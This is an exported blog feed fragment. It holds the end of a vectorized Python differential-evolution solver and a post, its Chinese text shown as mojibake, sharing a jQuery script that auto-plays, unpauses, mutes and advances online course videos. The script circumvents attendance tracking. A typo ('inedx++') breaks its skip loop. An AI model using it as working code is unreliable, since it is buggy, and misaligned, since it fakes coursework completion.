bounds=self.limits.T,</span><br><span class="line">                              args=self.args)</span><br><span class="line"></span><br><span class="line">            self._nfev += result.nfev</span><br><span class="line">            DE_result.nfev = self._nfev</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result.fun &lt; DE_result.fun:</span><br><span class="line">                DE_result.fun = result.fun</span><br><span class="line">                DE_result.x = result.x</span><br><span class="line">                DE_result.jac = result.jac</span><br><span class="line">                <span class="comment"># to keep internal state consistent</span></span><br><span class="line">                self.population_energies[<span class="number">0</span>] = result.fun</span><br><span class="line">                self.population[<span class="number">0</span>] = self._unscale_parameters(result.x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DE_result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_calculate_population_energies</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Calculate the energies of all the population members at the same time.</span></span><br><span class="line"><span class="string">        Puts the best member in first place. Useful if the population has just</span></span><br><span class="line"><span class="string">        been initialised.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line">        <span class="comment"># CHANGES: self.func operates on the entire parameters array</span></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line">        itersize = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="built_in">len</span>(self.population),</span><br><span class="line">                       self.maxfun - self._nfev + <span class="number">1</span>))</span><br><span class="line">        candidates = self.population[:itersize]</span><br><span class="line">        parameters = np.array([self._scale_parameters(c)</span><br><span class="line">                              <span class="keyword">for</span> c <span class="keyword">in</span> candidates])  <span class="comment"># <span class="doctag">TODO:</span> can be vectorized</span></span><br><span class="line">        energies = self.func(parameters, *self.args)</span><br><span class="line">        self.population_energies = energies</span><br><span class="line">        self._nfev += itersize</span><br><span class="line"></span><br><span class="line">        <span class="comment"># for index, candidate in enumerate(self.population):</span></span><br><span class="line">        <span class="comment">#     if self._nfev &gt; self.maxfun:</span></span><br><span class="line">        <span class="comment">#         break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     parameters = self._scale_parameters(candidate)</span></span><br><span class="line">        <span class="comment">#     self.population_energies[index] = self.func(parameters,</span></span><br><span class="line">        <span class="comment">#                                                 *self.args)</span></span><br><span class="line">        <span class="comment">#     self._nfev += 1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line"></span><br><span class="line">        minval = np.argmin(self.population_energies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># put the lowest energy into the best solution position.</span></span><br><span class="line">        lowest_energy = self.population_energies[minval]</span><br><span class="line">        self.population_energies[minval] = self.population_energies[<span class="number">0</span>]</span><br><span class="line">        self.population_energies[<span class="number">0</span>] = lowest_energy</span><br><span class="line"></span><br><span class="line">        self.population[[<span class="number">0</span>, minval], :] = self.population[[minval, <span class="number">0</span>], :]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Evolve the population by a single generation</span></span><br><span class="line"><span class="string">        Returns</span></span><br><span class="line"><span class="string">        -------</span></span><br><span class="line"><span class="string">        x : ndarray</span></span><br><span class="line"><span class="string">            The best solution from the solver.</span></span><br><span class="line"><span class="string">        fun : float</span></span><br><span class="line"><span class="string">            Value of objective function obtained from the best solution.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># the population may have just been initialized (all entries are</span></span><br><span class="line">        <span class="comment"># np.inf). If it has you have to calculate the initial energies</span></span><br><span class="line">        <span class="keyword">if</span> np.<span class="built_in">all</span>(np.isinf(self.population_energies)):</span><br><span class="line">            self._calculate_population_energies()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.dither <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.scale = (self.random_number_generator.rand()</span><br><span class="line">                          * (self.dither[<span class="number">1</span>] - self.dither[<span class="number">0</span>]) + self.dither[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line">        <span class="comment"># CHANGES: self.func operates on the entire parameters array</span></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line"></span><br><span class="line">        itersize = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(self.num_population_members,</span><br><span class="line">                       self.maxfun - self._nfev + <span class="number">1</span>))</span><br><span class="line">        trials = np.array([self._mutate(c)</span><br><span class="line">                          <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(itersize)])  <span class="comment"># <span class="doctag">TODO:</span> can be vectorized</span></span><br><span class="line">        <span class="keyword">for</span> trial <span class="keyword">in</span> trials:</span><br><span class="line">            self._ensure_constraint(trial)</span><br><span class="line">        parameters = np.array([self._scale_parameters(trial)</span><br><span class="line">                              <span class="keyword">for</span> trial <span class="keyword">in</span> trials])</span><br><span class="line">        energies = self.func(parameters, *self.args)</span><br><span class="line">        self._nfev += itersize</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> candidate, (energy, trial) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">zip</span>(energies, trials)):</span><br><span class="line">            <span class="comment"># if the energy of the trial candidate is lower than the</span></span><br><span class="line">            <span class="comment"># original population member then replace it</span></span><br><span class="line">            <span class="keyword">if</span> energy &lt; self.population_energies[candidate]:</span><br><span class="line">                self.population[candidate] = trial</span><br><span class="line">                self.population_energies[candidate] = energy</span><br><span class="line"></span><br><span class="line">                <span class="comment"># if the trial candidate also has a lower energy than the</span></span><br><span class="line">                <span class="comment"># best solution then replace that as well</span></span><br><span class="line">                <span class="keyword">if</span> energy &lt; self.population_energies[<span class="number">0</span>]:</span><br><span class="line">                    self.population_energies[<span class="number">0</span>] = energy</span><br><span class="line">                    self.population[<span class="number">0</span>] = trial</span><br><span class="line"></span><br><span class="line">        <span class="comment"># for candidate in range(self.num_population_members):</span></span><br><span class="line">        <span class="comment">#     if self._nfev &gt; self.maxfun:</span></span><br><span class="line">        <span class="comment">#         raise StopIteration</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     # create a trial solution</span></span><br><span class="line">        <span class="comment">#     trial = self._mutate(candidate)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     # ensuring that it&#x27;s in the range [0, 1)</span></span><br><span class="line">        <span class="comment">#     self._ensure_constraint(trial)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     # scale from [0, 1) to the actual parameter value</span></span><br><span class="line">        <span class="comment">#     parameters = self._scale_parameters(trial)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     # determine the energy of the objective function</span></span><br><span class="line">        <span class="comment">#     energy = self.func(parameters, *self.args)</span></span><br><span class="line">        <span class="comment">#     self._nfev += 1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#     # if the energy of the trial candidate is lower than the</span></span><br><span class="line">        <span class="comment">#     # original population member then replace it</span></span><br><span class="line">        <span class="comment">#     if energy &lt; self.population_energies[candidate]:</span></span><br><span class="line">        <span class="comment">#         self.population[candidate] = trial</span></span><br><span class="line">        <span class="comment">#         self.population_energies[candidate] = energy</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#         # if the trial candidate also has a lower energy than the</span></span><br><span class="line">        <span class="comment">#         # best solution then replace that as well</span></span><br><span class="line">        <span class="comment">#         if energy &lt; self.population_energies[0]:</span></span><br><span class="line">        <span class="comment">#             self.population_energies[0] = energy</span></span><br><span class="line">        <span class="comment">#             self.population[0] = trial</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line">        <span class="comment">##############</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.x, self.population_energies[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Evolve the population by a single generation</span></span><br><span class="line"><span class="string">        Returns</span></span><br><span class="line"><span class="string">        -------</span></span><br><span class="line"><span class="string">        x : ndarray</span></span><br><span class="line"><span class="string">            The best solution from the solver.</span></span><br><span class="line"><span class="string">        fun : float</span></span><br><span class="line"><span class="string">            Value of objective function obtained from the best solution.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># next() is required for compatibility with Python2.7.</span></span><br><span class="line">        <span class="keyword">return</span> self.__next__()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_scale_parameters</span>(<span class="params">self, trial</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        scale from a number between 0 and 1 to parameters.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.__scale_arg1 + (trial - <span class="number">0.5</span>) * self.__scale_arg2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_unscale_parameters</span>(<span class="params">self, parameters</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        scale from parameters to a number between 0 and 1.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (parameters - self.__scale_arg1) / self.__scale_arg2 + <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_ensure_constraint</span>(<span class="params">self, trial</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        make sure the parameters lie between the limits</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> np.where((trial &lt; <span class="number">0</span>) | (trial &gt; <span class="number">1</span>))[<span class="number">0</span>]:</span><br><span class="line">            trial[index] = self.random_number_generator.rand()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_mutate</span>(<span class="params">self, candidate</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        create a trial vector based on a mutation strategy</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        trial = np.copy(self.population[candidate])</span><br><span class="line"></span><br><span class="line">        rng = self.random_number_generator</span><br><span class="line"></span><br><span class="line">        fill_point = rng.randint(<span class="number">0</span>, self.parameter_count)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.strategy <span class="keyword">in</span> [<span class="string">&#x27;currenttobest1exp&#x27;</span>, <span class="string">&#x27;currenttobest1bin&#x27;</span>]:</span><br><span class="line">            bprime = self.mutation_func(candidate,</span><br><span class="line">                                        self._select_samples(candidate, <span class="number">5</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bprime = self.mutation_func(self._select_samples(candidate, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.strategy <span class="keyword">in</span> self._binomial:</span><br><span class="line">            crossovers = rng.rand(self.parameter_count)</span><br><span class="line">            crossovers = crossovers &lt; self.cross_over_probability</span><br><span class="line">            <span class="comment"># the last one is always from the bprime vector for binomial</span></span><br><span class="line">            <span class="comment"># If you fill in modulo with a loop you have to set the last one to</span></span><br><span class="line">            <span class="comment"># true. If you don&#x27;t use a loop then you can have any random entry</span></span><br><span class="line">            <span class="comment"># be True.</span></span><br><span class="line">            crossovers[fill_point] = <span class="literal">True</span></span><br><span class="line">            trial = np.where(crossovers, bprime, trial)</span><br><span class="line">            <span class="keyword">return</span> trial</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.strategy <span class="keyword">in</span> self._exponential:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; self.parameter_count <span class="keyword">and</span></span><br><span class="line">                   rng.rand() &lt; self.cross_over_probability):</span><br><span class="line"></span><br><span class="line">                trial[fill_point] = bprime[fill_point]</span><br><span class="line">                fill_point = (fill_point + <span class="number">1</span>) % self.parameter_count</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> trial</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_best1</span>(<span class="params">self, samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        best1bin, best1exp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r0, r1 = samples[:<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span> (self.population[<span class="number">0</span>] + self.scale *</span><br><span class="line">                (self.population[r0] - self.population[r1]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_rand1</span>(<span class="params">self, samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        rand1bin, rand1exp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r0, r1, r2 = samples[:<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">return</span> (self.population[r0] + self.scale *</span><br><span class="line">                (self.population[r1] - self.population[r2]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_randtobest1</span>(<span class="params">self, samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        randtobest1bin, randtobest1exp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r0, r1, r2 = samples[:<span class="number">3</span>]</span><br><span class="line">        bprime = np.copy(self.population[r0])</span><br><span class="line">        bprime += self.scale * (self.population[<span class="number">0</span>] - bprime)</span><br><span class="line">        bprime += self.scale * (self.population[r1] -</span><br><span class="line">                                self.population[r2])</span><br><span class="line">        <span class="keyword">return</span> bprime</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_currenttobest1</span>(<span class="params">self, candidate, samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        currenttobest1bin, currenttobest1exp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r0, r1 = samples[:<span class="number">2</span>]</span><br><span class="line">        bprime = (self.population[candidate] + self.scale *</span><br><span class="line">                  (self.population[<span class="number">0</span>] - self.population[candidate] +</span><br><span class="line">                   self.population[r0] - self.population[r1]))</span><br><span class="line">        <span class="keyword">return</span> bprime</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_best2</span>(<span class="params">self, samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        best2bin, best2exp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r0, r1, r2, r3 = samples[:<span class="number">4</span>]</span><br><span class="line">        bprime = (self.population[<span class="number">0</span>] + self.scale *</span><br><span class="line">                  (self.population[r0] + self.population[r1] -</span><br><span class="line">                   self.population[r2] - self.population[r3]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bprime</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_rand2</span>(<span class="params">self, samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        rand2bin, rand2exp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r0, r1, r2, r3, r4 = samples</span><br><span class="line">        bprime = (self.population[r0] + self.scale *</span><br><span class="line">                  (self.population[r1] + self.population[r2] -</span><br><span class="line">                   self.population[r3] - self.population[r4]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bprime</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_select_samples</span>(<span class="params">self, candidate, number_samples</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        obtain random integers from range(self.num_population_members),</span></span><br><span class="line"><span class="string">        without replacement.  You can&#x27;t have the original candidate either.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        idxs = <span class="built_in">list</span>(<span class="built_in">range</span>(self.num_population_members))</span><br><span class="line">        idxs.remove(candidate)</span><br><span class="line">        self.random_number_generator.shuffle(idxs)</span><br><span class="line">        idxs = idxs[:number_samples]</span><br><span class="line">        <span class="keyword">return</span> idxs</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘è¯¾ Auto Play</title>
      <link href="2022/08/28/%E7%BD%91%E8%AF%BEAutoPlay/"/>
      <url>2022/08/28/%E7%BD%91%E8%AF%BEAutoPlay/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æ²¹çŒ´ä¸Šè¶…æ˜Ÿå°”é›…çš„æŒ‚è¯¾è„šæœ¬ä¸å¥½ä½¿ï¼Œè‡ªå·±å¼„ç‚¹åŸºç¡€çš„åŠŸèƒ½å…ˆç”¨ç€ã€‚è„šæœ¬ç›´æ¥ä»ç½‘ä¸ŠCopyåå‘ç°ä¸èƒ½ç›´æ¥ç”¨ï¼Œåº”è¯¥æ˜¯å¹³å°æ›´æ–°çš„ç¼˜æ•…ï¼Œç»è¿‡ä¸€äº›åˆ—è°ƒæ•´ä¹‹åæˆåŠŸè·‘èµ·æ¥äº†ï¼Œæ”¾å‡ºæ¥é€ ç¦ç¤¾ä¼š</p><span id="more"></span><h1 id="ç½‘è¯¾-Auto-Play"><a href="#ç½‘è¯¾-Auto-Play" class="headerlink" title="ç½‘è¯¾ Auto Play"></a>ç½‘è¯¾ Auto Play</h1><blockquote><p>å“ªäº›è¯¾è¯¥ç”¨è„šæœ¬æŒ‚å“ªäº›è¯¾ä¸è¯¥ç”¨è„šæœ¬å–å†³äºä½¿ç”¨è€…è‡ªå·±çš„è®¤çŸ¥ï¼Œæ…ç”¨</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body = $(<span class="string">&quot;body&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> button = $(<span class="string">&quot;&lt;li id=&#x27;set&#x27;&gt;&lt;/li&gt;&quot;</span>)</span><br><span class="line">button.html(<span class="string">&quot;&lt;span id=&#x27;start&#x27;&gt;å¼€å¯è‡ªåŠ¨æ’­æ”¾æ¨¡å¼&lt;/span&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> json = &#123;</span><br><span class="line">    <span class="string">&quot;background&quot;</span>: <span class="string">&quot;#36f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;height&quot;</span>: <span class="string">&quot;16px&quot;</span>,</span><br><span class="line">    <span class="string">&quot;padding&quot;</span>: <span class="string">&quot;5px&quot;</span>,</span><br><span class="line">    <span class="string">&quot;z-index&quot;</span>: <span class="number">999</span>, <span class="comment">// Stay top</span></span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;pointer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bottom&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;left&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;color&quot;</span>: <span class="string">&quot;#fff&quot;</span>,</span><br><span class="line">    <span class="string">&quot;position&quot;</span>: <span class="string">&quot;fixed&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">button.css(json);</span><br><span class="line">body.append(button)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Index of current video</span></span><br><span class="line"><span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line">$(<span class="string">&quot;.posCatalog_select&quot;</span>).each(<span class="function">(<span class="params">i, item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($(item).hasClass(<span class="string">&quot;posCatalog_active&quot;</span>)) &#123;</span><br><span class="line">        index = i;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;ç¬¬&quot;</span> + (index + <span class="number">1</span>) + <span class="string">&quot;ä¸ªè§†é¢‘å¼€å§‹æ’­æ”¾&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Blacklist of course id, courses in this list will be skipped</span></span><br><span class="line"><span class="keyword">var</span> blacklist = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoNext</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    index++;</span><br><span class="line">    <span class="keyword">var</span> selectID = $(<span class="string">&quot;.posCatalog_select&quot;</span>)[index].id;</span><br><span class="line">    <span class="keyword">while</span> (selectID.indexOf(<span class="string">&#x27;cur&#x27;</span>) == -<span class="number">1</span> || blacklist.indexOf(selectID) != -<span class="number">1</span>)</span><br><span class="line">        inedx++;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;ç¬¬&quot;</span> + (index + <span class="number">1</span>) + <span class="string">&quot;ä¸ªè§†é¢‘å¼€å§‹æ’­æ”¾&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> next = <span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;.posCatalog_select&quot;</span>)[index].querySelector(<span class="string">&quot;.posCatalog_name&quot;</span>);</span><br><span class="line">    next.click();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> progressRecord = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">button.click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Get iframe</span></span><br><span class="line">        <span class="keyword">var</span> video = $(<span class="string">&quot;iframe&quot;</span>).contents().find(<span class="string">&quot;iframe&quot;</span>).contents();</span><br><span class="line">        <span class="comment">// Get video progress 0~100 float</span></span><br><span class="line">        <span class="keyword">var</span> spans = video.find(<span class="string">&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-progress-control.vjs-control &gt; div&quot;</span>).attr(<span class="string">&quot;aria-valuenow&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> play = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (spans == progressRecord) &#123;</span><br><span class="line">                video.find(<span class="string">&quot;#video &gt; button&quot;</span>).click();</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;è§†é¢‘è¢«æš‚åœï¼Œå·²ç»§ç»­&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            progressRecord = spans;</span><br><span class="line">            <span class="keyword">var</span> slience = video.find(<span class="string">&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-volume-panel.vjs-control.vjs-volume-panel-vertical &gt; button&quot;</span>);</span><br><span class="line">            <span class="comment">// Mute</span></span><br><span class="line">            <span class="keyword">if</span> (slience.attr(<span class="string">&quot;title&quot;</span>) != <span class="string">&quot;å–æ¶ˆé™éŸ³&quot;</span>) &#123;</span><br><span class="line">                slience.click();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> load = video.find(<span class="string">&quot;#loading&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (load.css(<span class="string">&quot;visibility&quot;</span>) != <span class="string">&quot;hidden&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (spans != <span class="number">100</span>) &#123;</span><br><span class="line">            play();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;ç¬¬&quot;</span> + (index + <span class="number">1</span>) + <span class="string">&quot;ä¸ªè§†é¢‘æ’­æ”¾å®Œæˆ&quot;</span>);</span><br><span class="line">            autoNext();</span><br><span class="line">        &#125;</span><br><span class="line">        $(<span class="string">&quot;#start&quot;</span>).html(<span class="string">&quot;è‡ªåŠ¨æ¨¡å¼å·²å¼€å¯,æœ¬è§†é¢‘è¿›åº¦:&quot;</span> + spans + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="æ›´å¤šæ³¨è§£"><a href="#æ›´å¤šæ³¨è§£" class="headerlink" title="æ›´å¤šæ³¨è§£"></a>æ›´å¤šæ³¨è§£</h2><ul><li><p><code>Line20</code>ï¼šæ‰¾æ­£åœ¨æ’­æ”¾çš„è§†é¢‘çš„<code>index</code>çš„æ€è·¯ï¼š</p><ul><li><p>å…ƒç´ å®¡æŸ¥è§‚å¯Ÿå³ä¾§è¯¾ç¨‹åˆ—è¡¨</p><p>  <img src="/images/MOOC_Element.png"></p><p>  é€‰æ‹©ä¸­çš„é€‰é¡¹æŒ‡å‘ä¸¤ä¸ªç±»ï¼Œ<code>posCatalog_select</code>ï¼Œ<code>posCatalog_active</code>ï¼Œé€šè¿‡è§‚å¯Ÿï¼Œå‰è€…æ˜¯ä¸€èˆ¬çš„é€‰é¡¹çš„ç±»ï¼Œåè€…ä¸»è¦å°±è´Ÿè´£æ˜¾ç¤ºä¸€ä¸ªè“è‰²çš„é€‰ä¸­æ ·å¼ï¼Œç”±æ­¤ï¼Œå«æœ‰<code>posCatalog_active</code>è¿™ä¸ªç±»çš„å°±æ˜¯è¢«é€‰ä¸­çš„è§†é¢‘</p></li></ul></li><li><p><code>Line32</code>ï¼šæ’­æ”¾ä¸‹ä¸€ä¸ªè§†é¢‘çš„æ€è·¯ï¼š</p><ul><li>ä¸€æ ·çš„å…ƒç´ å®¡æŸ¥ï¼Œè§ä¸Šå›¾ï¼Œè™½ç„¶æ­£å¸¸æƒ…å†µä¸‹åªéœ€è¦<code>index++</code>å³å¯ï¼Œä½†æ˜¯ç›®å½•çš„ç±»ä¹Ÿæ˜¯<code>posCatalog_select</code>ï¼ˆæ¯”å¦‚ä¸Šå›¾ä¸­çš„<code>2 åŠ³åŠ¨ä¸äººç”Ÿ</code>å°±æ˜¯ä¸€ä¸ªfolderï¼Œç‚¹äº†ä¹Ÿå°±æ˜¯æŠ˜å 